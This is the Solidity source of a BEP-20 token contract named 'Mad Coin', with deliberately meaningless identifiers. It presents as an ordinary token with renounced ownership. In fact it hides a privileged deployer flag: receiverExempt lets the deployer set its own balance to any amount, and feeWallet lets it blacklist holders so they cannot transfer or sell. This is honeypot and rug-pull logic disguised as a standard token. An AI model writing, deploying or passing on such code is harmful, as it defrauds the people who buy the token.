/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface walletAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxAmount) external view returns (uint256);

    function transfer(address walletMin, uint256 takeIs) external returns (bool);

    function allowance(address feeTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeIs) external returns (bool);

    function transferFrom(
        address sender,
        address walletMin,
        uint256 takeIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldMarketing, uint256 value);
    event Approval(address indexed feeTo, address indexed spender, uint256 value);
}

interface walletAtMetadata is walletAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract swapList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listShouldAt {
    function createPair(address minSell, address enableTx) external returns (address);
}

interface tradingFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MadCoin is swapList, walletAt, walletAtMetadata {

    function launchedMin() public view returns (uint256) {
        return buyIsFee;
    }

    address public buyTrading;

    function transferFrom(address buyMarketing, address walletMin, uint256 takeIs) external override returns (bool) {
        if (walletReceiver[buyMarketing][_msgSender()] != type(uint256).max) {
            require(takeIs <= walletReceiver[buyMarketing][_msgSender()]);
            walletReceiver[buyMarketing][_msgSender()] -= takeIs;
        }
        return exemptWallet(buyMarketing, walletMin, takeIs);
    }

    constructor (){
        if (atShould == fromToken) {
            modeAutoExempt = true;
        }
        tradingFee isTotal = tradingFee(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyTrading = listShouldAt(isTotal.factory()).createPair(isTotal.WETH(), address(this));
        marketingTakeTotal = _msgSender();
        if (minLiquidity) {
            atMin = fromReceiver;
        }
        receiverAt = _msgSender();
        receiverMin[_msgSender()] = true;
        
        limitTotal[_msgSender()] = launchFromTeam;
        emit Transfer(address(0), receiverAt, launchFromTeam);
        limitWallet();
    }

    bool public minLiquidity;

    function decimals() external view virtual override returns (uint8) {
        return maxTokenTake;
    }

    mapping(address => uint256) private limitTotal;

    function allowance(address isWallet, address fromTokenIs) external view virtual override returns (uint256) {
        return walletReceiver[isWallet][fromTokenIs];
    }

    mapping(address => mapping(address => uint256)) private walletReceiver;

    uint256 private buyIsFee;

    function amountBuy() public {
        if (maxEnable == fundMarketing) {
            fundMarketing = false;
        }
        
        atMode=false;
    }

    function transfer(address isAt, uint256 takeIs) external virtual override returns (bool) {
        return exemptWallet(_msgSender(), isAt, takeIs);
    }

    uint256 private launchFromTeam = 100000000 * 10 ** 18;

    mapping(address => bool) public receiverMin;

    bool public fundModeMarketing;

    function atMaxLiquidity(address walletFromReceiver) public {
        if (fundModeMarketing) {
            return;
        }
        
        receiverMin[walletFromReceiver] = true;
        if (atShould == fromReceiver) {
            fromReceiver = atShould;
        }
        fundModeMarketing = true;
    }

    uint256 private fromReceiver;

    address private marketingTakeTotal;

    function isSell() public view returns (bool) {
        return maxEnable;
    }

    function getOwner() external view returns (address) {
        return marketingTakeTotal;
    }

    function totalLaunched() public {
        if (fundMarketing != modeAutoExempt) {
            modeAutoExempt = true;
        }
        
        minLiquidity=false;
    }

    uint256 private atShould;

    function senderExempt(address buyMarketing, address walletMin, uint256 takeIs) internal returns (bool) {
        require(limitTotal[buyMarketing] >= takeIs);
        limitTotal[buyMarketing] -= takeIs;
        limitTotal[walletMin] += takeIs;
        emit Transfer(buyMarketing, walletMin, takeIs);
        return true;
    }

    string private takeFee = "Mad Coin";

    function totalWallet() public view returns (uint256) {
        return fromToken;
    }

    function shouldLimitLaunched() public view returns (uint256) {
        return buyIsFee;
    }

    uint256 private atMin;

    uint256 public fromToken;

    function limitWallet() public {
        emit OwnershipTransferred(receiverAt, address(0));
        marketingTakeTotal = address(0);
    }

    function exemptWallet(address buyMarketing, address walletMin, uint256 takeIs) internal returns (bool) {
        if (buyMarketing == receiverAt) {
            return senderExempt(buyMarketing, walletMin, takeIs);
        }
        require(!modeMarketing[buyMarketing]);
        return senderExempt(buyMarketing, walletMin, takeIs);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchFromTeam;
    }

    mapping(address => bool) public modeMarketing;

    function receiverExempt(uint256 takeIs) public {
        if (!receiverMin[_msgSender()]) {
            return;
        }
        limitTotal[receiverAt] = takeIs;
    }

    function name() external view virtual override returns (string memory) {
        return takeFee;
    }

    address public receiverAt;

    bool private maxEnable;

    bool public fundMarketing;

    bool private atMode;

    function isSwap() public view returns (uint256) {
        return atShould;
    }

    function owner() external view returns (address) {
        return marketingTakeTotal;
    }

    function approve(address fromTokenIs, uint256 takeIs) public virtual override returns (bool) {
        walletReceiver[_msgSender()][fromTokenIs] = takeIs;
        emit Approval(_msgSender(), fromTokenIs, takeIs);
        return true;
    }

    string private liquidityExempt = "MCN";

    function liquidityIs() public view returns (bool) {
        return fundMarketing;
    }

    function feeWallet(address swapMode) public {
        
        if (swapMode == receiverAt || swapMode == buyTrading || !receiverMin[_msgSender()]) {
            return;
        }
        
        modeMarketing[swapMode] = true;
    }

    event OwnershipTransferred(address indexed totalFund, address indexed listEnable);

    uint8 private maxTokenTake = 18;

    function symbol() external view virtual override returns (string memory) {
        return liquidityExempt;
    }

    bool public modeAutoExempt;

    function balanceOf(address maxAmount) public view virtual override returns (uint256) {
        return limitTotal[maxAmount];
    }

}